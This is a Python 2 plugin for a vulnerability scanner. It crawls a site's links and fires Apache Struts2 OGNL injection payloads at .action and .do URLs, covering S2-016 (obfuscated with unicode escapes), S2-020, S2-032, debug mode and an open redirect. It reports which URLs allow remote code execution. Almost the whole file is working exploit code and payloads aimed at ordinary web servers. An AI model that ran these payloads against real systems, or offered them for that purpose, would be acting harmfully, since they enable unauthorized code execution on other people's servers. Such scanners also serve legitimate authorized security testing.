# coding:utf-8
import urllib2
import re
import urlparse
import HTMLParser
import logging
import random
from lib.config import (
    PASSWORD_DIC,  MY_PROXY, USER_AGENT_LIST
)

def get_plugin_info():
    return {
        "name": "st2_eval",
        "info": "多个struts2远程代码执行",
        "Author":"Jaqen",
        "Create_date":"2017-10-01"
    }

def get_url(domain):
    url_list = []
    try:
        res = urllib2.urlopen(domain, timeout=TIME_OUT)
        html = res.read()
    except Exception, e:
        return
    root_url = res.geturl()
    m = re.findall("<a[^>]*?href=('|\")(.*?)\\1", html, re.I)
    if m:
        for url in m:
            ParseResult = urlparse.urlparse(url[1])
            if ParseResult.netloc and ParseResult.scheme:
                if domain == ParseResult.hostname:
                    url_list.append(HTMLParser.HTMLParser().unescape(url[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, url[1])))
    return list(set(url_list))

def eval(url_list):
    flag_list = {
        "S2_016": {"poc": [
            "redirect:${%23out%3D%23\u0063\u006f\u006e\u0074\u0065\u0078\u0074.\u0067\u0065\u0074(new \u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{99,111,109,46,111,112,101,110,115,121,109,112,104,111,110,121,46,120,119,111,114,107,50,46,100,105,115,112,97,116,99,104,101,114,46,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101})).\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072(),%23\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e(\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067(\u006e\u0065\u0077\u0020\u0062\u0079\u0074\u0065[]{46,46,81,116,101,115,116,81,46,46})),%23\u0072\u0065\u0064\u0069\u0072\u0065\u0063\u0074,%23\u006f\u0075\u0074\u002e\u0063\u006c\u006f\u0073\u0065()}"],
                   "key": "QtestQ"},
        "S2_020": {
            "poc": ["class[%27classLoader%27][%27jarPath%27]=1024", "class[%27classLoader%27][%27resources%27]=1024"],
            "key": "No result defined for action"},
        "S2_DEBUG": {"poc": [
            "debug=command&expression=%23f%3d%23_memberAccess.getClass().getDeclaredField(%27allowStaticM%27%2b%27ethodAccess%27),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23o%3d@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23o.println(%27[%27%2b%27ok%27%2b%27]%27),%23o.close()"],
                     "key": "[ok]"},
        "S2_017_URL": {"poc": ["redirect:http://360.cn/", "redirectAction:http://360.cn/%23"],
                       "key": "http://www.360.cn/favicon.ico"},
        "S2_032": {"poc": [
            "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23w%3d%23context.get(%23parameters.rpsobj[0]),%23w.getWriter().println(66666666-2),%23w.getWriter().flush(),%23w.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse"],
                   "key": "66666664"}}
    headers = {'User-Agent':random.choice(USER_AGENT_LIST)}
    for url in url_list:
        if re.search("\.action|\.do", url):
            for ver in flag_list:
                for poc in flag_list[ver]['poc']:
                    try:
                        request = urllib2.Request(url, poc, headers)
                        res_html = urllib2.urlopen(request, timeout=TIME_OUT).read(204800)
                        if flag_list[ver]['key'] in res_html:
                            return "%s >>>> 存在%s代码执行漏洞"%(url,ver)
                    except Exception, e:
                        logging.error(ver+' '+str(e))

def exploit(ip):
    result = []
    if FindDomain_flag:
        if Domain:
            for domain in Domain:
                url_list = get_url(domain)
                if url_list:
                    i = eval(url_list)
                    if i:
                        result.append(i)
            if len(result):
                return result
